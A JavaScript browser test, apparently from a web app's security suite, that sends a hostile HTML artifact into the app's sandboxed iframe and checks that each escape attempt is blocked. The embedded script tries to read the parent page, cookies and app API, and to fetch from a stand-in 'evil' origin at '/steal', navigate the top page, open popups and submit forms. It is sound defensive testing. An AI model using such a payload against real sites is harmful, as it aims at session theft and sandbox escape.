// Real-browser attack on the delivered-try sandbox. Run outside any sandbox:
//   PLAYWRIGHT_DIR=/path/to/node_modules npm run test:artifact-origin
// A hostile artifact tries to read the app page, the signed-in cookie, the app API, navigate the
// top page, open windows, submit forms and reach a second origin. Every attempt must fail.
import assert from 'node:assert/strict';
import { createRequire } from 'node:module';
import { createServer } from 'node:http';
import { join } from 'node:path';
import { Store } from '../../core/store.js';
import { Auth } from '../../app/auth.js';
import { createServerFor } from '../../app/http.js';

if (!process.env.NODE_TEST_CONTEXT) await main();

async function main() {
  const require = createRequire(import.meta.url);
  const playwright = require(join(process.env.PLAYWRIGHT_DIR || '', 'playwright'));
  const store = new Store(); const auth = new Auth(store);
  const password = 'correct-horse-9-battery';
  for (const [id, leader] of [['lead', true], ['steward', false], ['one', false], ['two', false]])
    await auth.createUser(id, password, leader);
  let evilHits = 0;
  const evil = createServer((req, res) => { evilHits++; res.writeHead(200, { 'access-control-allow-origin': '*' }); res.end('x'); });
  await new Promise(r => evil.listen(0, '127.0.0.1', r));
  const evilOrigin = `http://127.0.0.1:${evil.address().port}`;
  const port = 20000 + Math.floor(Math.random() * 20000);
  const base = `http://127.0.0.1:${port}`;
  const real = createServerFor({ store, auth, secure: false, origin: base });
  await new Promise(r => real.listen(port, '127.0.0.1', r));
  const api = async (cookie, csrf, path, body, method = 'POST') => {
    const response = await fetch(base + path, { method, headers: { 'content-type': 'application/json', origin: base,
      ...(cookie ? { cookie } : {}), ...(csrf ? { 'x-csrf-token': csrf } : {}) }, body: body === undefined ? undefined : JSON.stringify(body) });
    return { status: response.status, body: await response.json().catch(() => ({})), headers: response.headers };
  };
  const login = async id => {
    const r = await api('', '', '/api/login', { id, password });
    return { cookie: r.headers.get('set-cookie').split(';')[0], csrf: r.body.csrf };
  };
  const lead = await login('lead'), steward = await login('steward');
  const send = (who, path, body) => api(who.cookie, who.csrf, path, body);
  const made = await send(steward, '/api/items', { problem: 'p', have: true, have_note: 'looked', verdict: 'build_needed' });
  const id = made.body.id;
  await send(steward, `/api/items/${id}/events`, { type: 'specced', must: ['x'], how_we_know: ['x'], out_of_scope: [] });
  await send(lead, '/api/stepup', { password });
  await send(lead, `/api/items/${id}/events`, { type: 'approved', cap_usd: 1, quorum: 2 });
  const attack = `<!doctype html><body><pre id=out>running</pre><script>
const r = {}; const t = async (k, f) => { try { r[k] = String(await f()); } catch (e) { r[k] = 'BLOCKED:' + e.name; } };
(async () => {
  await t('parentDom', () => parent.document.title);
  await t('topDom', () => top.document.body.innerHTML.length);
  await t('cookie', () => document.cookie || 'EMPTY');
  await t('localStorage', () => localStorage.length);
  await t('appApi', async () => (await fetch('${base}/api/items', { credentials: 'include' })).status);
  await t('evilFetch', async () => (await fetch('${evilOrigin}/steal')).status);
  await t('evilImage', () => new Promise((ok, no) => { const i = new Image(); i.onload = ok; i.onerror = () => no(new Error('x')); i.src = '${evilOrigin}/img'; }));
  await t('topNav', () => { top.location = '${evilOrigin}/nav'; return 'navigated'; });
  await t('popup', () => { const w = window.open('${evilOrigin}/popup'); if (!w) throw new Error('none'); return 'opened'; });
  await t('form', () => { const f = document.createElement('form'); f.action = '${evilOrigin}/form'; f.method = 'post'; f.target = '_top'; document.body.append(f); f.submit(); return 'submitted'; });
  document.getElementById('out').textContent = JSON.stringify(r);
})();
</script></body>`;
  const delivered = await send(steward, `/api/items/${id}/artifact`, { html: attack });
  assert.equal(delivered.status, 201, JSON.stringify(delivered.body));
  const browser = await playwright.chromium.launch({ headless: true, executablePath: process.env.CHROME_PATH || '/usr/bin/google-chrome', args: ['--no-sandbox'] });
  const context = await browser.newContext();
  await context.addCookies([{ name: steward.cookie.split('=')[0], value: steward.cookie.split('=').slice(1).join('='), url: base }]);
  const page = await context.newPage();
  page.on('dialog', d => { throw new Error('dialog ' + d.message()); });
  const popups = []; context.on('page', p => { if (p !== page) popups.push(p.url()); });
  await page.goto(`${base}/items/${id}`);
  const frame = page.frameLocator('iframe[title="Playable try"]');
  await frame.locator('#out').waitFor();
  await page.waitForFunction(() => document.querySelector('iframe')?.contentDocument === null || true);
  const handle = await page.locator('iframe[title="Playable try"]').elementHandle();
  const inner = await handle.contentFrame();
  await inner.waitForFunction(() => document.getElementById('out').textContent.startsWith('{'), null, { timeout: 8000 });
  const result = JSON.parse(await inner.locator('#out').textContent());
  const topUrl = page.url();
  await browser.close(); real.close(); evil.close();
  for (const key of ['parentDom', 'topDom', 'localStorage', 'appApi', 'evilFetch', 'evilImage', 'topNav', 'popup'])
    assert.match(result[key], /BLOCKED/, `${key} must be blocked, got ${result[key]}`);
  assert.match(result.cookie, /^(EMPTY|BLOCKED)/, 'artifact must not see the session cookie');
  assert.equal(topUrl, `${base}/items/${id}`, 'top page must not be navigated');
  assert.deepEqual(popups, []);
  assert.equal(evilHits, 0, 'no request may reach the second origin');
  console.log('artifact origin audit passed', JSON.stringify(result));
}
